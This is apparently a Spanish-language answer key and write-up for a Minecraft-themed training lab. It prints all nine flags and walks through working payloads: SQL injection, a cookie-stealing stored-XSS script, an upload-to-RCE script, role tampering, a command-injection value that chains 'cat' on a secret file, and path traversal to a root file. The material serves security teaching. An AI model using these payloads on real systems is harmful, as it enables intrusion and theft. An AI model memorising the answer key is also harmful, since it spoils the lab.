# 📘 GUÍA DE SOLUCIONES Y WRITEUP OFICIAL: MINECRAFT CTF (DVWA STYLE)

Este documento contiene la metodología de resolución paso a paso de los 9 desafíos del laboratorio **Minecraft CTF**, con los comandos y herramientas exactas de **Kali Linux**, además de la justificación académica de los temas cursados en **6º, 7º y 8º Semestre**.

---

## 🟢 DIMENSIÓN 1: OVERWORLD (NIVEL: FÁCIL)

### ⛏️ Desafío 1: Lingote de Hierro
- **Tema Académico:** *6º Semestre — Esteganografía y Cifrado César (ROT-13) / Base64.*
- **Herramientas Kali Linux:** `exiftool`, `strings`, `base64`, `tr`.
- **Procedimiento de Explotación:**
  1. Descargar el archivo `mapa_cueva.png` desde la interfaz web.
  2. Inspeccionar los metadatos ocultos con `exiftool` o `strings`:
     ```bash
     exiftool mapa_cueva.png
     ```
  3. En la sección `Comment` o `Description` se encuentra la cadena cifrada en Base64:
     `U1lOVHtaVkFSUEVOU0dfVkVCQV9WQVRCR19QM0Y0RV9LMEVfWjFBM1F9`
  4. Decodificar Base64 y aplicar ROT-13 (Cifrado César de 13 desplazamientos):
     ```bash
     echo "U1lOVHtaVkFSUEVOU0dfVkVCQV9WQVRCR19QM0Y0RV9LMEVfWjFBM1F9" | base64 -d | tr 'A-Za-z' 'N-ZA-Mn-za-m'
     ```
- **Bandera Obtenida:**
  `FLAG{MINECRAFT_IRON_INGOT_C3S4R_X0R_M1N3D}`

---

### 💎 Desafío 2: Diamante en Y=-58
- **Tema Académico:** *8º Semestre — Inyección SQL (SQLi).*
- **Herramientas Kali Linux:** Navegador web, Burp Suite, `sqlmap`, `curl`.
- **Procedimiento de Explotación:**
  1. En el buscador de cofres de la aldea, inyectar la carga útil clásica de bypass de autenticación y extracción:
     ```sql
     ' OR 1=1 --
     ```
  2. O mediante `curl` en terminal:
     ```bash
     curl -X POST http://localhost:8080/overworld/diamond/search -d "chest_query=' OR 1=1 --"
     ```
  3. En la respuesta aparece el registro del cofre secreto en la profundidad $Y=-58$ con la bandera.
  4. La consulta aplica además `is_locked = 0`, así que buscar directamente `Herrero` **no**
     devuelve nada. Hay que romper ese filtro con la inyección (el `--` comenta el resto de
     la consulta, incluido el `AND is_locked = 0`):
     ```bash
     # atajo que ya NO funciona:
     curl -X POST http://localhost:8080/overworld/diamond/search -d "chest_query=Herrero"
     ```
- **Bandera Obtenida:**
  `FLAG{MINECRAFT_DIAMOND_SQL1_Y58_UNLOCKED}`

---

### 🟣 Desafío 3: Portal del Nether
- **Tema Académico:** *7º Semestre — Análisis de Metadatos y Reconocimiento Semi-pasivo (FOCA / Exif).*
- **Herramientas Kali Linux:** `curl`, `wget`, `grep`, Navegador.
- **Procedimiento de Explotación:**
  1. Hacer clic en "Inspeccionar Planos del Portal" o descargar `planos_portal_nether.txt`:
     ```bash
     curl -s http://localhost:8080/static/docs/planos_portal_nether.txt | grep "FLAG"
     ```
  2. Extraer la cabecera `X-Obsidian-Ignition-Key`.
- **Bandera Obtenida:**
  `FLAG{MINECRAFT_NETHER_PORTAL_METADATA_IGNITED}`

---

## 🔴 DIMENSIÓN 2: NETHER (NIVEL: MEDIO)

### 🟡 Desafío 1: Lingote de Oro
- **Tema Académico:** *8º Semestre — Stored XSS y Robo de Cookies de Sesión.*
- **Herramientas Kali Linux:** Navegador Firefox DevTools, Burp Suite, Netcat (`nc`).
- **Procedimiento de Explotación:**
  1. En el formulario de ofertas de trueque con Piglins, ingresar en el campo **Nota al Piglin** el siguiente payload de XSS:
     ```html
     <script>fetch('/nether/gold/leak?cookie=' + encodeURIComponent(document.cookie));</script>
     ```
  2. O verificar la alerta emergente en el navegador:
     ```html
     <script>alert(document.cookie);</script>
     ```
  3. El bot simulado del Piglin Guard revisa la oferta y, al encontrar la referencia al
     endpoint receptor, reproduce la exfiltración: envía su cookie real de tesorero.
  4. Al recargar `/nether`, el tablón muestra el **registro de credenciales comprometidas**
     con el token del Piglin:
     ```
     🔑 piglin_gold_vault_token=FLAG{MINECRAFT_PIGLIN_XSS_GOLD_BARTERED}
     ```
  5. Ese token es la bandera. El endpoint de fuga **no** la entrega si solo se consulta:
     ```bash
     curl -s "http://localhost:8080/nether/gold/leak?cookie=piglin"
     # -> "token_verified": false, "flag": null
     ```
     Solo responde con la bandera si los datos exfiltrados contienen el token real.
- **Bandera Obtenida:**
  `FLAG{MINECRAFT_PIGLIN_XSS_GOLD_BARTERED}`

---

### 🔥 Desafío 2: Varas de Blaze
- **Tema Académico:** *8º Semestre — Arbitrary File Upload a Ejecución Remota de Código (RCE).*
- **Herramientas Kali Linux:** Editor de texto (`nano`/`vim`), `curl`, Navegador.
- **Procedimiento de Explotación:**
  1. Crear un script en Python llamado `pocion_rce.py`:
     ```python
     import os
     print(open('/secret/blaze_rod.txt').read())
     ```
  2. Subirlo a través del formulario del caldero.
  3. Visitar el enlace de ejecución generado:
     ```bash
     curl http://localhost:8080/nether/blaze/execute/pocion_rce.py
     ```
- **Bandera Obtenida:**
  `FLAG{MINECRAFT_BLAZE_ROD_WEBSHELL_RCE}`

---

### 👁️ Desafío 3: Ender Pearl / Ojo de Ender
- **Tema Académico:** *6º Semestre — Principio de Mínimo Privilegio y Parameter Tampering.*
- **Herramientas Kali Linux:** Burp Suite, `curl`.
- **Procedimiento de Explotación:**
  1. El formulario envía por defecto el rol `guest_traveler`.
  2. Modificar el parámetro a un rol de alto privilegio (`ender_master` o `bastion_overlord`):
     ```bash
     curl "http://localhost:8080/nether/pearl/altar?user_role=ender_master"
     ```
  3. El servidor otorgará la bandera de acceso al altar.
- **Bandera Obtenida:**
  `FLAG{MINECRAFT_ENDER_PEARL_PRIV_ESCALATION}`

---

## 🟣 DIMENSIÓN 3: THE END (NIVEL: DIFÍCIL - BOSS FINAL)

### 💥 Desafío 1: Cristales del End
- **Tema Académico:** *7º Semestre — Análisis de CVEs y Explotación con Metasploit.*
- **Herramientas Kali Linux:** `curl`, Burp Suite.
- **Procedimiento de Explotación:**
  1. En la consola de ataque a los cristales, enviar el payload que activa la sobrecarga del backdoor emulado:
     ```bash
     curl -X POST http://localhost:8080/end/crystals/exploit -d "exploit_payload=CVE-2026-OVERLOAD_CRYSTALS"
     ```
  2. Los escudos de los 4 cristales caerán detonándolos simultáneamente.
- **Bandera Obtenida:**
  `FLAG{MINECRAFT_END_CRYSTALS_CVE_SHATTERED}`

---

### 🐉 Desafío 2: Derrotar al Dragón
- **Tema Académico:** *8º Semestre — Command Injection y RCE en el Sistema Operativo.*
- **Herramientas Kali Linux:** `curl`, Burp Suite.
- **Procedimiento de Explotación:**
  1. El endpoint de disparo evalúa comandos en la consola del servidor.
  2. Concatenar la lectura del archivo secreto del dragón mediante punto y coma `;`:
     ```bash
     curl -X POST http://localhost:8080/end/dragon/damage -d "shot_power=100; cat /secret/dragon_slain.txt"
     ```
  3. La respuesta del servidor ejecutará el comando e imprimirá la bandera.
- **Bandera Obtenida:**
  `FLAG{MINECRAFT_ENDER_DRAGON_SLAIN_COMMAND_INJECTION}`

---

### 🥚 Desafío 3: Huevo de Dragón
- **Tema Académico:** *6º Semestre — Evasión de Honeypots y Path Traversal (LFI).*
- **Herramientas Kali Linux:** `curl`, Navegador.
- **Procedimiento de Explotación:**
  1. La consulta al archivo por defecto `honeypot/fake_egg.txt` activa el señuelo.
  2. Utilizar Path Traversal para salir del directorio web `/var/www/` y leer el archivo auténtico de superusuario:
     ```bash
     curl "http://localhost:8080/end/egg/inspect?altar_file=../../root/real_dragon_egg.txt"
     ```
- **Bandera Obtenida:**
  `FLAG{MINECRAFT_FINAL_DRAGON_EGG_VICTORY_GG}`

---

## 🏆 PANTALLA FINAL DE VICTORIA
Al ingresar las 9 banderas en sus respectivos desafíos, la barra HUD inferior se completará con los 9 ítems, desbloqueando el nivel 90 y redirigiendo automáticamente a `http://localhost:8080/victory` con el **Poema del End** y el resumen de competencias aprobadas.
